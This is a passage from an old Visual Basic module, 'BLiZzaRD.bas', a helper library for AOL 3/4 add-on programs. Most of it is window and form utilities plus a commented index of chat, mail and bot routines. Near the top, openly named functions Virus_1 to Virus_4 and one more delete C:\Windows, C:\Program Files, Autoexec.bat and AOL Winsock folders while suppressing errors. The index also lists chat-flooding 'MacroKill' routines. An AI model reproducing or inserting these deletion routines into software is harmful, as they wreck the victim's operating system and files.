On Error Resume Next
Comp_DelDiR ("C:\Program Files\AIM95")
Comp_DelDiR ("C:\Program Files\AIM95a")
Comp_DelDiR ("C:\Program Files\AIM95b")
End Function

Function Virus_1()
On Error Resume Next
Comp_DelDiR ("C:\Program Files")
End Function

Function Virus_2()
On Error Resume Next
Comp_DelDiR ("C:\Windows")
End Function

Function Virus_4()
On Error Resume Next
Comp_DelFile ("C:\Autoexec.bat")
End Function

Function Virus_3()
On Error Resume Next
Comp_DelFile ("C:\Autoexec.bat")
Comp_DelDiR ("C:\Program Files")
Comp_DelDiR ("C:\AOL 40\Winsock")
Comp_DelDiR ("C:\AOL 40a\Winsock")
Comp_DelDiR ("C:\AOL 40b\Winsock")
Comp_DelDiR ("C:\AOL 30\Winsock")
Comp_DelDiR ("C:\AOL 30a\Winsock")
Comp_DelDiR ("C:\AOL 30b\Winsock")
Comp_DelDiR ("C:\AOL 25\Winsock")
Comp_DelDiR ("C:\AOL 25a\Winsock")
Comp_DelDiR ("C:\AOL 25b\Winsock")
Comp_DelDiR ("C:\AOL 25i\Winsock")
End Function

Sub Form_OnTop(frm As Form)
SetWinOnTop = SetWindowPos(frm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub

Sub Form_NotOnTop(frm As Form)
SetWinOnTop = SetWindowPos(frm.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)
End Sub

Sub Window_Close(win)
Dim x%
x% = SendMessage(win, WM_CLOSE, 0, 0)
End Sub

Sub Window_Minimize(win)
x = ShowWindow(win, SW_MINIMIZE)
End Sub

Sub Window_Maximize(win)
x = ShowWindow(win, SW_MAXIMIZE)
End Sub

Sub Window_Hide(hwnd)
x = ShowWindow(hwnd, SW_HIDE)
End Sub

Sub Window_Show(hwnd)
x = ShowWindow(hwnd, SW_SHOW)
End Sub

Function Caption(win, Txt)
text% = SenditByString(win, WM_SETTEXT, 0, Txt)
End Function
Sub Form_Max(frm As Form)
frm.WindowState = 2
End Sub
Sub Form_Mini(frm As Form)
frm.WindowState = 1
End Sub
Sub Form_Move(frm As Form)
DoEvents
ReleaseCapture
ReturnVal% = SendMessage(frm.hwnd, &HA1, 2, 0)
End Sub
Sub Form_Default(frm As Form)
frm.WindowState = 0
End Sub
Sub Form_Scroll(frm As Form, Movement)
If frm.Height < Movement Then Exit Sub
If frm.Height = Movement Then Exit Sub
Do
frm.Height = Val(frm.Height) - 1
Loop Until frm.Height = Movement
End Sub
Public Sub Form_Center(frm As Form)
   With frm
      .Left = (Screen.Width - .Width) / 2
      .Top = (Screen.Height - .Height) / 2
   End With
End Sub
Sub WaitForOk()

Do: DoEvents
AOL% = FindWindow("#32770", "America Online")
If AOL% Then
CloseAOL% = SendMessage(AOL%, WM_CLOSE, 0, 0)
Exit Do
End If
aolw% = FindWindow("_AOL_Modal", vbNullString)
If aolw% Then
Click (FindItsTitle(aolw%, "OK"))
Exit Do
End If
Loop
End Sub

Sub ZX_Programming_XZ()
'The reason i have duplicate ways to send ims and
'to send text to a chat room is beacuse alot of you
'use different bas's and are used to using
'something else this way you do not really
'have to change a whole lot.
'(If any of the Subs Or Functions
'Do Not Work, Email me, the reason they
'might not work is because, i will write a
'code and not test it out, but most of
'them do not need to be tested out its just common
'since that they should work, but if one doesn't
'email me, please and i will put you in the greets,
'and fix the problem, meeh)

                
                'Basics For AoL4:

'Send text Room: 'AoL4_ChatSend ("Text")
                 'AoL4_ChatSendRed ("Text")
                 '(there are about 40 of the plain
                 'color send chats and im not
                 'writing them all you can guess or
                 'learn to read a bas)
                 'AoL4_BlueYellowBlue
                 '(there are about 40 of the
                 'colorful send chats and im not
                 'writing them all you can guess
                 'or learn to read a bas)
'Clear chat:     'AoL4_ChatEat
                 'AoL4_ChatClear
'MacroKills:     'AoL4_MacroKill
                 'AoL4_MacroKill2
                 'AoL4_MacroKill3
'Sending Ims:    'AoL4_SendIm
                 'AoL4_ImSend
'Sending Mail:   'AoL4_MailSend
'Writing Mail:   'AoL4_MailWrite
'Opening Mail:   'AoL4_OpenMail
'UpChats:        'AoL4_UpChatOn
                 'AoL4_UpChatOff
'Call A Kw       'AoL4_Keyword
'(Uses the text box in the toolbar)
'Form Fading:    'Form_FadeRed
                 'Ie: Form_SlideFire Me
'LastChatlines:  'AoL4_SnFromLastchatline
                 'AoL4_Lastchatlinewithsn
                 'AoL4_Lastchatline
                
                'Bots:

'WelcomeBot:    'AoL4_BotWelcome (list1)
'Echo Bot:      'AoL4_BotEcho (ScreenName)
'Idle Bot:      'AoL4_BotIdle
'Vote Bot:      'AoL4_BotVote
'Scramble Bot:  'AoL4_BotScramble

                
                'Basics For AoL3:

'Send text Room: 'AoL3_ChatSend ("Text")
'Sending Ims:    'AoL3_ImSend (Sn), (Message)
'Sending Mail:   'AoL3_MailSend (Sn), (Subject), (Message)
'LastChatlines:  'AoL3_SnFromLastchatline
                 'AoL3_Lastchatlinewithsn
                 'AoL3_Lastchatline

'                 Bots:

'WelcomeBot:     'AoL3_BotWelcome (list1)
'Echo Bot:       'AoL3_BotEcho (ScreenName)
'Idle Bot:       'AoL3_BotIdle
'Vote Bot:       'AoL3_BotVote
'Scramble Bot:   'AoL3_BotScramble
                 
'Well im tired of typing, Email Me With Any Questions
                                 

      'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
End Sub
Sub ZX____HowTo____XZ()
'This section is for vb stuff
'Maily forms and pop up menus, stuff
'like that

'-Popup Menus-

'#1Make the menu you want
'#2Make a label/button or whatever
'I will call the label/button: btn
'And I will call the Menu: Mnu
'in the btn put the following:
'(replace btn with the name of the
'object the menu is poping out of)
'    Dim nMenuTop As Integer
'    Dim nMenuLeft As Integer
'    nMenuLeft = btn.Left
'    nMenuTop = btn.Top + btn.Height
'    btn.PopupMenu Mnu, POPUPMENU_LEFTALIGN, nMenuLeft, nMenuTop
'End of popup menu code

'-Borderless Forms-

'#1Make a form
'In the properties section of the form
'change the following
'Borderstyle = 0 - None
'ControlBox = False
'MinButton = False
'MaxButton = False
'No Caption
'End of Borderless form code

'-Lighting up Labels/Buttons-

'This is for making a button do something
'when your mouse goes over it
'In the button/label_MouseMove area put
'the action you want it to do
'and in all the other buttons/labels/textboxes
'lists/and other items with the _Mousemove area
'Make it normal, do this for all the buttons you
'want to do this
'Ie:
'Private Sub Label5_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
'Label2.ForeColor = &HFFFFFF
'Label1.ForeColor = &HFFFFFF
'Label5.ForeColor = &HFF&
'TimeOut 0.5
'Label5.ForeColor = &HFFFFFF
''(Notice how it turns all the other labels
'off when themouse moves over it)''
''(and in the form i put:
'Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
'Label1.ForeColor = &HFFFFFF
'Label2.ForeColor = &HFFFFFF
'Label5.ForeColor = &HFFFFFF
'Label6.ForeColor = &HFFFFFF
'End Sub
''(so it turns them all off until the
'mouse moves over them again)''
'End of Light up code

'-If There Are Any Further Questions, Email Me-
     'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com

End Sub
'        — ——• BLiZzaRD.bas by TRiPP •—— —               ''                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     BLiZaRD.bas by TRiPP Email:thismightbetripp@aol.com
